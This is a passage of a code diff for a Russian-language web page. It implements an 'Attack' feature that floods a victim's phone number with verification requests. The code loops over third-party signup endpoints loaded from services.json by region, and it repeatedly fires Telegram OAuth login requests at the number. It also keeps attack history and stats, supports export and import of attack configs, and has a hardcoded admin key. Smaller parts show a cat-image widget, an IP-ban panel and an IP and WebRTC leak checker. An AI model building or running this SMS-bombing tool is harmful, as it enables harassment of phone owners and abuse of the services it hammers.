+  document.getElementById('quoteText').textContent = `"${f.q}"`;
+  document.getElementById('quoteSrc').textContent = `— ${f.c} · ${f.a}`;
+}
+fetchQuote();
+document.getElementById('newQuoteBtn').addEventListener('click', fetchQuote);
+
+// ========== НЕКО ==========
+const nekoImg = document.getElementById('nekoImg');
+async function fetchNeko() {
+  nekoImg.style.opacity = '0.3';
+  let url = '';
+  try {
+    const r = await fetch('https://nekos.life/api/v2/img/meow');
+    if (r.ok) { const d = await r.json(); url = d.url; }
+  } catch(e) {}
+  if (!url) {
+    try {
+      const r = await fetch('https://api.waifu.pics/sfw/neko');
+      if (r.ok) { const d = await r.json(); url = d.url; }
+    } catch(e) {}
+  }
+  setImageWithFallback(nekoImg, url, WAIFU_FALLBACK);
+}
+document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
+fetchNeko();
+setInterval(fetchNeko, 30000);
+
+// ========== АУДИО FALLBACK ==========
+document.getElementById('audioPlayer').addEventListener('error', () => {
+  document.getElementById('audioFallback').style.display = 'block';
+});
+
+// ========== TG OAUTH КНОПКИ (внутри Attack) ==========
+function populateTgServiceButtons() {
+  const container = document.getElementById('tgServiceButtons');
+  container.innerHTML = '';
+  tgAuthServices.forEach(svc => {
+    const btn = document.createElement('button');
+    btn.className = 'tg-service-btn';
+    btn.textContent = svc.name;
+    btn.addEventListener('click', () => sendSingleTgOAuth(svc));
+    container.appendChild(btn);
+  });
+}
+
+async function sendSingleTgOAuth(service) {
+  const phone = document.getElementById('attackPhone').value.trim();
+  if (!phone) return alert('Введите номер телефона');
+  const url = 'https://oauth.telegram.org/auth/request';
+  const headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Origin': 'https://oauth.telegram.org',
+    'Referer': 'https://oauth.telegram.org/auth'
+  };
+  const body = new URLSearchParams({
+    phone: phone,
+    bot_id: service.bot_id,
+    origin: service.origin,
+    request_access: 'write',
+    return_to: 'https://fragment.com/'
+  });
+  try {
+    await fetch(url, { method: 'POST', headers, body, mode: 'no-cors' });
+    console.log(`[${service.name}] OK`);
+  } catch(e) {
+    console.error(`[${service.name}] ERR`, e);
+  }
+}
+
+// ========== ЗАГРУЗКА services.json ==========
+let servicesDB = { ru: [], by: [], kz: [] };
+(async function loadServices() {
+  try {
+    const resp = await fetch('services.json');
+    if (resp.ok) {
+      const data = await resp.json();
+      if (data && typeof data === 'object') {
+        ['ru','by','kz'].forEach(region => {
+          if (Array.isArray(data[region])) servicesDB[region] = data[region];
+        });
+      }
     }
+  } catch(e) { console.warn('services.json не загружен'); }
+})();
 
-    attackRunning = true;
-    attackAbortController = new AbortController();
-    attackStats = { total: 0, success: 0, failed: 0 };
-    attackStartTime = Date.now();
+function formatPhone(phone, type) {
+  const clean = phone.replace(/\D/g, '');
+  switch(type) {
+    case 'wp': case 'cp': case 'ru': case 'sp': return '+' + clean;
+    default: return clean;
+  }
+}
 
-    document.getElementById('attackStartBtn').style.display = 'none';
-    document.getElementById('attackStopBtn').style.display = 'inline-block';
-    document.getElementById('atkRegionLabel').textContent = attackRegion.toUpperCase();
-    document.getElementById('atkTimeLeft').textContent = attackDuration;
-    document.getElementById('atkProgressFill').style.width = '0%';
-    document.getElementById('atkTotal').textContent = '0';
-    document.getElementById('atkSuccess').textContent = '0';
-    document.getElementById('atkFailed').textContent = '0';
-    document.getElementById('atkOverlay').classList.add('active');
+function applyPlaceholders(template, phone) {
+  return template.replace(/\{(\w+)\}/g, (_, key) => {
+    if (key === 'rand_name') return 'Иван';
+    if (key === 'rand_surname') return 'Петров';
+    if (key === 'rand_email') return 'user@mail.ru';
+    if (key === 'rand_hex32') return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+    if (key === 'rand_days') return '5';
+    if (key === 'rand_int100_999') return '500';
+    if (key === 'rand_hex26') return 'abcdefabcdefabcdefabcdef';
+    return formatPhone(phone, key);
+  });
+}
 
+async function sendServiceRequest(service, phone, signal) {
+  let url = service.url;
+  const method = service.method || 'POST';
+  const headers = {};
+  let body = null;
+  if (service.params && Object.keys(service.params).length > 0) {
+    const urlObj = new URL(url);
+    Object.entries(service.params).forEach(([k, v]) => {
+      urlObj.searchParams.set(k, applyPlaceholders(String(v), phone));
+    });
+    url = urlObj.toString();
+  } else {
+    url = applyPlaceholders(url, phone);
+  }
+  if (service.headers) {
+    Object.entries(service.headers).forEach(([k, v]) => {
+      headers[k] = applyPlaceholders(String(v), phone);
+    });
+  }
+  if (service.type === 'json') {
+    body = JSON.stringify(service.body);
+    headers['Content-Type'] = 'application/json';
+    body = applyPlaceholders(body, phone);
+  } else if (service.type === 'form' && service.body) {
+    const params = new URLSearchParams();
+    Object.entries(service.body).forEach(([k, v]) => {
+      params.append(k, applyPlaceholders(String(v), phone));
+    });
+    body = params.toString();
+    headers['Content-Type'] = 'application/x-www-form-urlencoded';
+  }
+  try {
+    await fetch(url, { method, headers, body, mode: 'no-cors', signal });
+    return true;
+  } catch (err) {
+    if (err.name === 'AbortError') throw err;
+    return false;
+  }
+}
+
+async function sendTgOAuthRequest(service, phone, signal) {
+  const url = 'https://oauth.telegram.org/auth/request';
+  const headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Origin': 'https://oauth.telegram.org',
+    'Referer': 'https://oauth.telegram.org/auth'
+  };
+  const body = new URLSearchParams({
+    phone: phone,
+    bot_id: service.bot_id,
+    origin: service.origin,
+    request_access: 'write',
+    return_to: 'https://fragment.com/'
+  });
+  try {
+    await fetch(url, { method: 'POST', headers, body, mode: 'no-cors', signal });
+    return true;
+  } catch (err) {
+    if (err.name === 'AbortError') throw err;
+    return false;
+  }
+}
+
+let attackRunning = false;
+let attackAbortController = null;
+let attackStats = { total: 0, success: 0, failed: 0 };
+let attackStartTime = null;
+let attackDuration = 0;
+let attackRegion = 'ru';
+let tgIndex = 0; // для чередования TG-сервисов
+
+document.getElementById('attackStartBtn').addEventListener('click', startAttack);
+document.getElementById('attackStopBtn').addEventListener('click', stopAttack);
+document.getElementById('atkStopOverlayBtn').addEventListener('click', stopAttack);
+
+function startAttack() {
+  if (attackRunning) return;
+  const phone = document.getElementById('attackPhone').value.trim();
+  if (!phone) return alert('Введите номер телефона');
+
+  // Админ-ключ
+  if (phone === 'hacklam787') {
+    document.getElementById('adminPanel').classList.toggle('active');
+    updateAdminPanel();
+    return;
+  }
+
+  const useTg = document.getElementById('tgSpawnToggle').checked;
+  attackDuration = parseInt(document.getElementById('attackDur').value) || 60;
+  attackRegion = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
+  const services = servicesDB[attackRegion] || [];
+  if (!services.length && !useTg) {
+    alert('Нет сервисов для региона ' + attackRegion.toUpperCase());
+    return;
+  }
+
+  attackRunning = true;
+  attackAbortController = new AbortController();
+  attackStats = { total: 0, success: 0, failed: 0 };
+  attackStartTime = Date.now();
+  tgIndex = 0;
+
+  document.getElementById('attackStartBtn').style.display = 'none';
+  document.getElementById('attackStopBtn').style.display = 'inline-block';
+  document.getElementById('atkRegionLabel').textContent = attackRegion.toUpperCase();
+  document.getElementById('atkTimeLeft').textContent = attackDuration;
+  document.getElementById('atkProgressFill').style.width = '0%';
+  document.getElementById('atkTotal').textContent = '0';
+  document.getElementById('atkSuccess').textContent = '0';
+  document.getElementById('atkFailed').textContent = '0';
+  document.getElementById('atkOverlay').classList.add('active');
+
+  (async () => {
     try {
       while (attackRunning && (Date.now() - attackStartTime) < attackDuration * 1000) {
+        // Проходим основные сервисы
         for (const svc of services) {
           if (!attackRunning) break;
           attackStats.total++;
           const ok = await sendServiceRequest(svc, phone, attackAbortController.signal);
           if (ok) attackStats.success++;
           else attackStats.failed++;
-          if (attackStats.total % 5 === 0) {
-            document.getElementById('atkTotal').textContent = attackStats.total;
-            document.getElementById('atkSuccess').textContent = attackStats.success;
-            document.getElementById('atkFailed').textContent = attackStats.failed;
-          }
+          if (attackStats.total % 5 === 0) updateStatsDisplay();
+          await new Promise(r => setTimeout(r, 50));
+        }
+        // Если включён TG-спам, добавляем по одному TG-сервису за цикл
+        if (useTg && tgAuthServices.length > 0) {
+          if (!attackRunning) break;
+          const tgSvc = tgAuthServices[tgIndex % tgAuthServices.length];
+          attackStats.total++;
+          const tgOk = await sendTgOAuthRequest(tgSvc, phone, attackAbortController.signal);
+          if (tgOk) attackStats.success++;
+          else attackStats.failed++;
+          tgIndex++;
+          if (attackStats.total % 5 === 0) updateStatsDisplay();
           await new Promise(r => setTimeout(r, 50));
         }
       }
     } catch(e) {}
     stopAttack();
-  }
+  })();
+}
 
-  function stopAttack() {
-    attackRunning = false;
-    if (attackAbortController) attackAbortController.abort();
-    attackAbortController = null;
-    document.getElementById('attackStartBtn').style.display = '';
-    document.getElementById('attackStopBtn').style.display = 'none';
-    document.getElementById('atkOverlay').classList.remove('active');
+function updateStatsDisplay() {
+  document.getElementById('atkTotal').textContent = attackStats.total;
+  document.getElementById('atkSuccess').textContent = attackStats.success;
+  document.getElementById('atkFailed').textContent = attackStats.failed;
+}
 
-    const phone = document.getElementById('attackPhone').value.trim();
-    if (phone && attackStats.total > 0) {
-      const record = {
-        date: new Date().toLocaleString('ru'),
-        phone,
-        region: attackRegion,
-        duration: attackDuration,
-        total: attackStats.total,
-        success: attackStats.success,
-        failed: attackStats.failed
-      };
-      let hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-      hist.unshift(record);
-      if (hist.length > 30) hist = hist.slice(0, 30);
-      localStorage.setItem('attack_hist', JSON.stringify(hist));
-      renderHistory();
-    }
-  }
+function stopAttack() {
+  attackRunning = false;
+  if (attackAbortController) attackAbortController.abort();
+  attackAbortController = null;
+  document.getElementById('attackStartBtn').style.display = '';
+  document.getElementById('attackStopBtn').style.display = 'none';
+  document.getElementById('atkOverlay').classList.remove('active');
 
-  setInterval(() => {
-    if (!attackRunning) return;
-    const elapsed = (Date.now() - attackStartTime) / 1000;
-    const left = Math.max(0, attackDuration - Math.floor(elapsed));
-    document.getElementById('atkTimeLeft').textContent = left;
-    document.getElementById('atkProgressFill').style.width = Math.min(100, Math.round((elapsed / attackDuration) * 100)) + '%';
-  }, 200);
-
-  function renderHistory() {
-    const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-    const container = document.getElementById('historyEntries');
-    if (!hist.length) {
-      container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
-      return;
-    }
-    container.innerHTML = hist.map(h => `
-      <div class="history-item">
-        <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.region}</span></div>
-        <div class="h-stats">
-          <span class="ok">✓${h.success}</span>
-          <span class="fail">✗${h.failed}</span>
-          <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
-          <span>${h.duration}s</span>
-        </div>
-        <div style="font-size:.7rem; margin-top:.2rem;">${h.date}</div>
-      </div>
-    `).join('');
-  }
-  renderHistory();
-
-  document.getElementById('qrBtn').addEventListener('click', () => {
-    const phone = document.getElementById('attackPhone').value.trim();
-    if (!phone) return alert('Введите номер');
-    window.open(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=tel:${encodeURIComponent(phone)}`, '_blank');
-  });
-
-  document.getElementById('exportBtn').addEventListener('click', () => {
-    const config = { phone: document.getElementById('attackPhone').value, region: attackRegion, dur: document.getElementById('attackDur').value };
-    const blob = new Blob([JSON.stringify(config)], {type:'application/json'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'attack_config.json';
-    a.click();
-    URL.revokeObjectURL(a.href);
-  });
-
-  document.getElementById('importBtn').addEventListener('click', () => {
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.accept = '.json';
-    input.onchange = e => {
-      const file = e.target.files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = () => {
-        try {
-          const cfg = JSON.parse(reader.result);
-          if (cfg.phone) document.getElementById('attackPhone').value = cfg.phone;
-          if (cfg.dur) document.getElementById('attackDur').value = cfg.dur;
-          if (cfg.region) {
-            document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
-            const target = document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`);
-            if (target) target.classList.add('active');
-          }
-        } catch(e) { alert('Ошибка импорта'); }
-      };
-      reader.readAsText(file);
+  const phone = document.getElementById('attackPhone').value.trim();
+  if (phone && phone !== 'hacklam787' && attackStats.total > 0) {
+    const record = {
+      date: new Date().toLocaleString('ru'),
+      phone,
+      region: attackRegion,
+      duration: attackDuration,
+      total: attackStats.total,
+      success: attackStats.success,
+      failed: attackStats.failed
     };
-    input.click();
-  });
-
-  document.getElementById('clearHistoryBtn').addEventListener('click', () => {
-    localStorage.removeItem('attack_hist');
+    let hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
+    hist.unshift(record);
+    if (hist.length > 30) hist = hist.slice(0, 30);
+    localStorage.setItem('attack_hist', JSON.stringify(hist));
     renderHistory();
-  });
+  }
+}
 
-  document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
-    chip.addEventListener('click', () => {
-      document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
-      chip.classList.add('active');
+setInterval(() => {
+  if (!attackRunning) return;
+  const elapsed = (Date.now() - attackStartTime) / 1000;
+  const left = Math.max(0, attackDuration - Math.floor(elapsed));
+  document.getElementById('atkTimeLeft').textContent = left;
+  document.getElementById('atkProgressFill').style.width = Math.min(100, Math.round((elapsed / attackDuration) * 100)) + '%';
+}, 200);
+
+function renderHistory() {
+  const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
+  const container = document.getElementById('historyEntries');
+  if (!hist.length) {
+    container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
+    return;
+  }
+  container.innerHTML = hist.map(h => `
+    <div class="history-item">
+      <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.region}</span></div>
+      <div class="h-stats">
+        <span class="ok">✓${h.success}</span>
+        <span class="fail">✗${h.failed}</span>
+        <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
+        <span>${h.duration}s</span>
+      </div>
+      <div style="font-size:.7rem; margin-top:.2rem;">${h.date}</div>
+    </div>
+  `).join('');
+}
+renderHistory();
+populateTgServiceButtons();
+
+document.getElementById('qrBtn').addEventListener('click', () => {
+  const phone = document.getElementById('attackPhone').value.trim();
+  if (!phone) return alert('Введите номер');
+  window.open(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=tel:${encodeURIComponent(phone)}`, '_blank');
+});
+
+document.getElementById('exportBtn').addEventListener('click', () => {
+  const config = { phone: document.getElementById('attackPhone').value, region: attackRegion, dur: document.getElementById('attackDur').value };
+  const blob = new Blob([JSON.stringify(config)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'attack_config.json';
+  a.click();
+  URL.revokeObjectURL(a.href);
+});
+
+document.getElementById('importBtn').addEventListener('click', () => {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.accept = '.json';
+  input.onchange = e => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = () => {
+      try {
+        const cfg = JSON.parse(reader.result);
+        if (cfg.phone) document.getElementById('attackPhone').value = cfg.phone;
+        if (cfg.dur) document.getElementById('attackDur').value = cfg.dur;
+        if (cfg.region) {
+          document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
+          const target = document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`);
+          if (target) target.classList.add('active');
+        }
+      } catch(e) { alert('Ошибка импорта'); }
+    };
+    reader.readAsText(file);
+  };
+  input.click();
+});
+
+document.getElementById('clearHistoryBtn').addEventListener('click', () => {
+  localStorage.removeItem('attack_hist');
+  renderHistory();
+});
+
+document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+  });
+});
+
+// ========== АДМИН-ПАНЕЛЬ ==========
+function getCurrentIp() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => d.ip)
+    .catch(() => 'неизвестно');
+}
+
+function getBannedIps() {
+  return JSON.parse(localStorage.getItem('banned_ips') || '[]');
+}
+
+function saveBannedIps(ips) {
+  localStorage.setItem('banned_ips', JSON.stringify(ips));
+}
+
+function updateAdminPanel() {
+  const banList = document.getElementById('banList');
+  const banned = getBannedIps();
+  banList.innerHTML = banned.length ? banned.map(ip => `<span style="display:inline-block; background:rgba(255,107,107,.1); padding:.3rem .6rem; margin:.2rem; border-radius:10px;">${ip} <span style="cursor:pointer; color:#ff6b6b;" data-ip="${ip}">✕</span></span>`).join('') : 'Нет забаненных IP';
+  document.querySelectorAll('#banList span[data-ip]').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      const ip = e.currentTarget.dataset.ip;
+      const newBanned = getBannedIps().filter(i => i !== ip);
+      saveBannedIps(newBanned);
+      updateAdminPanel();
     });
   });
+  getCurrentIp().then(ip => document.getElementById('adminCurrentIp').textContent = ip);
+}
 
-  // ========== IP CHECK (новый, надёжный API) ==========
-  async function runIpCheck() {
-    const tbody = document.getElementById('ipTableBody');
-    if (!tbody) return;
-    tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
+document.getElementById('addBanBtn').addEventListener('click', () => {
+  const ip = document.getElementById('banIpInput').value.trim();
+  if (!ip) return;
+  const banned = getBannedIps();
+  if (!banned.includes(ip)) {
+    banned.push(ip);
+    saveBannedIps(banned);
+    updateAdminPanel();
+  }
+});
 
-    try {
-      const resp = await fetch('https://ipwho.is/');
-      if (!resp.ok) throw new Error('Ошибка API');
-      const data = await resp.json();
+document.getElementById('clearBanBtn').addEventListener('click', () => {
+  saveBannedIps([]);
+  updateAdminPanel();
+});
 
-      const results = [];
-      const push = (method, result, cls) => results.push({ method, result, cls });
-
-      // IP и провайдер
-      push('IP адрес', data.ip || 'неизвестно', 'ok');
-      push('Хост', data.connection?.hostname || 'нет', 'ok');
-      push('Провайдер', data.connection?.org || 'неизвестно', 'ok');
-
-      // Гео
-      push('Страна', `${data.country} (${data.country_code})`, 'ok');
-      push('Регион', data.region || '—', 'ok');
-      push('Город', data.city || '—', 'ok');
-      push('Часовой пояс', data.timezone?.id || '—', 'ok');
-
-      // Безопасность
-      const sec = data.security || {};
-      push('VPN', sec.vpn ? 'да ⚠️' : 'нет', sec.vpn ? 'bad' : 'ok');
-      push('Прокси', sec.proxy ? 'да ⚠️' : 'нет', sec.proxy ? 'bad' : 'ok');
-      push('Tor', sec.tor ? 'да ⚠️' : 'нет', sec.tor ? 'bad' : 'ok');
-      push('Хостинг / Дата‑центр', sec.hosting ? 'да ⚠️' : 'нет', sec.hosting ? 'bad' : 'ok');
-      push('Анонимайзер', sec.anonymizer ? 'да ⚠️' : 'нет', sec.anonymizer ? 'bad' : 'ok');
-
-      // Дополнительно
-      push('Тип соединения', data.connection?.type || '—', 'ok');
-      push('Мобильная сеть', data.connection?.mobile ? 'да' : 'нет', 'ok');
-
-      tbody.innerHTML = '';
-      results.forEach(r => {
-        const row = document.createElement('tr');
-        row.innerHTML = `<td>${r.method}</td><td class="${r.cls}">${r.result}</td>`;
-        tbody.appendChild(row);
-      });
-    } catch (err) {
-      tbody.innerHTML = `<tr><td colspan="2" class="bad">Ошибка: ${err.message}</td></tr>`;
+// Блокировка доступа при загрузке
+(async function checkBan() {
+  if (window.location.protocol === 'file:') return;
+  try {
+    const ip = await getCurrentIp();
+    const banned = getBannedIps();
+    if (banned.includes(ip)) {
+      document.body.innerHTML = `<div style="display:flex; align-items:center; justify-content:center; height:100vh; font-family:var(--fb); color:var(--text); background:var(--bg);"><div style="text-align:center; padding:2rem; background:var(--card); border-radius:var(--radius); border:1px solid var(--border);"><h1 style="color:var(--accent);">🚫 Доступ запрещён</h1><p>Ваш IP (${ip}) заблокирован администратором.</p></div></div>`;
     }
+  } catch(e) {}
+})();
+
+// ========== IP CHECK (бесплатные API) ==========
+const IP_APIS = [
+  { url: 'http://ip-api.com/json', transform: d => ({ ip: d.query, country: d.country, city: d.city, isp: d.isp, org: d.org, as: d.as, proxy: d.proxy, hosting: d.hosting, mobile: d.mobile }) },
+  { url: 'https://ipinfo.io/json', transform: d => ({ ip: d.ip, country: d.country, city: d.city, isp: d.org, as: d.org?.split(' ')[0], privacy: { vpn: d.privacy?.vpn, proxy: d.privacy?.proxy, tor: d.privacy?.tor, hosting: d.privacy?.hosting } }) },
+  { url: 'https://freeipapi.com/api/json', transform: d => ({ ip: d.ipAddress, country: d.countryName, city: d.cityName, isp: d.isp, org: d.isp }) }
+];
+
+async function fetchFromApi(apiObj) {
+  const resp = await fetch(apiObj.url);
+  if (!resp.ok) throw new Error('API error');
+  const data = await resp.json();
+  return apiObj.transform(data);
+}
+
+async function runIpCheck() {
+  const tbody = document.getElementById('ipTableBody');
+  tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
+
+  let result = {};
+  for (const api of IP_APIS) {
+    try {
+      result = await fetchFromApi(api);
+      break;
+    } catch(e) { continue; }
   }
 
-  document.getElementById('refreshIpBtn').addEventListener('click', runIpCheck);
-  if (document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
+  if (!result.ip) {
+    tbody.innerHTML = '<tr><td colspan="2" class="bad">Не удалось получить данные</td></tr>';
+    return;
+  }
 
-})();
+  const rows = [
+    ['IP-адрес', result.ip],
+    ['Страна', result.country || '—'],
+    ['Город', result.city || '—'],
+    ['Провайдер (ISP)', result.isp || '—'],
+    ['Организация', result.org || '—'],
+    ['ASN', result.as || '—'],
+    ['Прокси', result.proxy ? 'Да' : 'Нет'],
+    ['VPN', result.privacy?.vpn ? 'Да' : 'Нет'],
+    ['Tor', result.privacy?.tor ? 'Да' : 'Нет'],
+    ['Хостинг / дата-центр', result.hosting || result.privacy?.hosting ? 'Да' : 'Нет']
+  ];
+
+  // WebRTC leak
+  let webrtcLeak = null;
+  if (window.RTCPeerConnection) {
+    try {
+      webrtcLeak = await new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (e) => {
+          if (e.candidate) {
+            const parts = e.candidate.candidate.split(' ');
+            const ip = parts[4];
+            if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
+              resolve(ip);
+              pc.close();
+            }
+          } else {
+            resolve(null);
+            pc.close();
+          }
+        };
+        setTimeout(() => { resolve(null); pc.close(); }, 3000);
+      });
+    } catch(e) {}
+  }
+  rows.push(['WebRTC утечка', webrtcLeak ? `Да (${webrtcLeak})` : 'Нет']);
+
+  tbody.innerHTML = rows.map(([label, val]) => {
+    let cls = 'ok';
+    if (val === 'Да') cls = 'warn';
+    if (label.includes('Tor') && val === 'Да') cls = 'bad';
+    return `<tr><td>${label}</td><td class="${cls}">${val}</td></tr>`;
+  }).join('');
+}
+
+document.getElementById('refreshIpBtn').addEventListener('click', runIpCheck);
+if (document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
 </script>
 </body>
 </html>
